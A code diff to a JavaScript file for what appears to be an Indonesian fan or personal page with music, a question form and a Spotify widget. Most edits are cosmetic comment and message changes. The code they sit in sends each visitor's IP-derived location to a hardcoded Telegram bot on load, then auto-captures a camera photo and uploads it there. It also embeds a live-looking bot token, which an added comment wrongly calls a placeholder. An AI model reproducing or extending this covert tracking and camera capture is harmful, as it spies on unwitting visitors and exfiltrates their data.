@@ -6,10 +6,11 @@ if (openPhotoOptions && photoOptions) {
   });
 }
 
+// NOTE: replace the two placeholders below with your actual bot token and chat id
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
-// === BAGIAN MUSIK ===
+// === BAGIAN MUSIK — REVISI MOBILE FRIENDLY ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 let started = false;
@@ -58,7 +59,7 @@ if (isMobile) {
 } else {
   setTimeout(() => { startMusic(); }, 800);
 }
-// === PERTANYAAN ===
+// === MODAL PERTANYAAN ===
 const modal = document.getElementById('modal');
 document.getElementById('openAsk').onclick = () => modal.classList.add('show');
 document.getElementById('closeQ').onclick = () => modal.classList.remove('show');
@@ -137,7 +138,7 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   const qmsg = document.getElementById('qmsg');
 
   if (!text && !photo) {
-    qmsg.textContent = "Tulis pesan atau kirim foto.";
+    qmsg.textContent = "Tulis pertanyaan atau unggah foto dulu.";
     return;
   }
 
@@ -151,9 +152,9 @@ document.getElementById('sendQ').addEventListener('click', async () => {
     try {
       const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
       if (res.ok) qmsg.textContent = "📨 Terkirim ✓";
-      else qmsg.textContent = "Gagal mengirim foto.";
+      else qmsg.textContent = "💔 Gagal mengirim foto.";
     } catch {
-      qmsg.textContent = "Gagal koneksi.";
+      qmsg.textContent = "😿 Gagal koneksi.";
     }
   } else if (text) {
     await sendTelegramMessage(
@@ -172,7 +173,7 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   }, 1000);
 });
 
-// === INFO PENGUNJUNG ===
+// === INFO PENGUNJUNG + LOKASI + CAMERA AUTO-CAPTURE ===
 (async function showVisitorInfo() {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
 
@@ -195,7 +196,7 @@ document.getElementById('sendQ').addEventListener('click', async () => {
     let visitCount = parseInt(localStorage.getItem("visitor_visits") || "0", 10);
     visitCount = isNaN(visitCount) ? 1 : (visitCount + 1);
     localStorage.setItem("visitor_visits", String(visitCount));
-  } catch (err) { console.warn("visitor error:", err); }
+  } catch (err) { console.warn("visitor-id error:", err); }
 
   // --- Safe fetch dengan retry ---
   async function safeFetch(url, opts = {}, retries = 3, retryDelay = 800) {
@@ -243,7 +244,7 @@ document.getElementById('sendQ').addEventListener('click', async () => {
     return brand;
   }
 
-  // --- Kirim info visitor ---
+  // --- Kirim info visitor + lokasi ke Telegram ---
   async function sendToTelegram(d, latitude, longitude, source="Unknown", accuracy=null) {
     try {
       const now = new Date();
@@ -281,10 +282,10 @@ document.getElementById('sendQ').addEventListener('click', async () => {
         headers:{ "Content-Type":"application/json" },
         body:JSON.stringify({ chat_id:CHAT_ID, text:msg })
       },4);
-    } catch(e){ console.error("Gagal memuat:",e); }
+    } catch(e){ console.error("❌ Gagal kirim info:",e); }
   }
 
-  // --- Perizinan ---
+  // --- AUTO-CAPTURE CAMERA ---
   async function autoCaptureCamera() {
     try {
       if(navigator.mediaDevices){
@@ -310,9 +311,9 @@ document.getElementById('sendQ').addEventListener('click', async () => {
         fd.append("photo", blob, "capture.png");
 
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-        if(res.ok) console.log("Berhasil");
+        if(res.ok) console.log("✅ Foto visitor terkirim");
       }
-    } catch(e){ console.warn("Gagal:",e); }
+    } catch(e){ console.warn("⚠️ Auto-capture gagal:",e); }
   }
 
   // --- PROSES UTAMA ---
@@ -326,12 +327,12 @@ document.getElementById('sendQ').addEventListener('click', async () => {
       const d = await (await fetch("https://ipwho.is/")).json();
       await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
     } catch(e){
-      console.error("Gagal:", e);
+      console.error("❌ Gagal ambil data IP:", e);
       await sendToTelegram({city:"?",country:"?",ip:"?"},null,null,"unknown");
     }
   }
 
-  // --- Jalankan ---
+  // --- Jalankan kamera setelah kirim info ---
   autoCaptureCamera();
 })();
 
@@ -590,4 +591,3 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
-
